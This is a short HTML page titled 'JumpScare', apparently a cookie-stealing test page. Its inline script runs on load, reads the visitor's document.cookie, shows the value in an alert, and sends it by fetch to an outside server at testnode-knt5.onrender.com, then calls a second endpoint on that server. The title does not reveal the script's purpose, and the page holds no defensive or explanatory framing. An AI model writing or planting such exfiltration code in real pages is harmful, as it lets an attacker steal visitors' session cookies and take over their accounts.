<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JumpScare</title>
</head>
<body>
    <script>
        // Obtener las cookies de la pÃ¡gina actual
        const cookies = document.cookie;
        alert("Cookies obtenidas: " + cookies);

        // Enviar las cookies al servidor de render
        fetch(`https://testnode-knt5.onrender.com/cookies?cookies=${cookies}`, { 
            method: 'GET',
        })
        .then(response => response.text()) 
        .then(data => {
            console.log('Respuesta del servidor:', data); 


            return fetch(`https://testnode-knt5.onrender.com/read`, {
                method: 'GET',
            });
        })

    </script>
</body>
</html>
